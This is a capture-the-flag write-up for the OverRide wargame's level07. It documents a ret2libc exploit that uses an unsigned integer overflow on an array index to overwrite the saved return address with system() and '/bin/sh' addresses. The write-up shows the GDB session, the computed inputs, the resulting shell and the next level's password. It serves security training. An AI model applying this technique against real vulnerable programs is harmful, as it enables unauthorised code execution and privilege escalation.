# Level07 Exploit

## Steps

### 1. Program Behavior

Running the program shows:

```bash
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------

Input command: 
```

### 2. Vulnerability Discovery

Using GDB, we identify a potential buffer overflow:

```gdb
(gdb) start
Temporary breakpoint 1 at 0x8048729
Starting program: /home/users/level07/level07 
Temporary breakpoint 1, 0x08048729 in main ()

(gdb) info frame
Stack level 0, frame at 0xffffd720:
 eip = 0x8048729 in main; saved eip 0xf7e45513
 Arglist at 0xffffd718, args: 
 Locals at 0xffffd718, Previous frame's sp is 0xffffd720
 Saved registers:
  ebp at 0xffffd718, eip at 0xffffd71c

(gdb) b read_number 
Breakpoint 2 at 0x80486dd
(gdb) continue
Continuing.
...
Input command: read
Breakpoint 2, 0x080486dd in read_number ()

(gdb) info register
eax            0xffffd554	-10924
...
esp            0xffffd500	0xffffd500
ebp            0xffffd528	0xffffd528
...

(gdb) print 0xffffd71c - 0xffffd554
$1 = 456
```

We find that our array is 456 bytes away from the EIP. Dividing by 4 (as it's a 32-bit system), we get 114, which is the index we need to target.

### 3. Exploit Development

To bypass security checks, we use unsigned integer overflow:

- Overflow calculation: 4294967296 / 4 = 1073741824
- Target index: 1073741824 + 114 = 1073741938

Next, we find the necessary addresses:

```gdb
(gdb) info function system
All functions matching regular expression "system":
Non-debugging symbols:
0xf7e6aed0  __libc_system
0xf7e6aed0  system

(gdb) find 0xf7e2c000,0xf7fcc000,"/bin/sh"
0xf7f897ec
1 pattern found.
```

Converting to decimal:
- system(): 0xf7e6aed0 = 4159090384
- "/bin/sh": 0xf7f897ec = 4160264172

## Exploit

### 4. Executing the Exploit

```bash
level07@OverRide:~$ ./level07 
----------------------------------------------------
  Welcome to wil's crappy number storage service!   
----------------------------------------------------
 Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
   wil has reserved some storage :>                 
----------------------------------------------------
Input command: store
 Number: 4159090384
 Index: 1073741938
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass   
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
$
```

### 5. Accessing the Next Level

```bash
level07@OverRide:~$ su level08
Password: 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
level08@OverRide:~$ 
```

## Explanation

This exploit works by:

1. Using integer overflow to bypass index checks and write to the EIP location (index 114).
2. Writing the address of system() to the EIP location.
3. Writing the address of "/bin/sh" to the next available slot (index 116) to serve as the argument for system().
4. When the program exits, it calls system("/bin/sh"), giving us a shell with elevated privileges.

The vulnerability lies in the program's failure to properly validate array indices, allowing us to write outside the intended array boundaries and overwrite critical memory locations.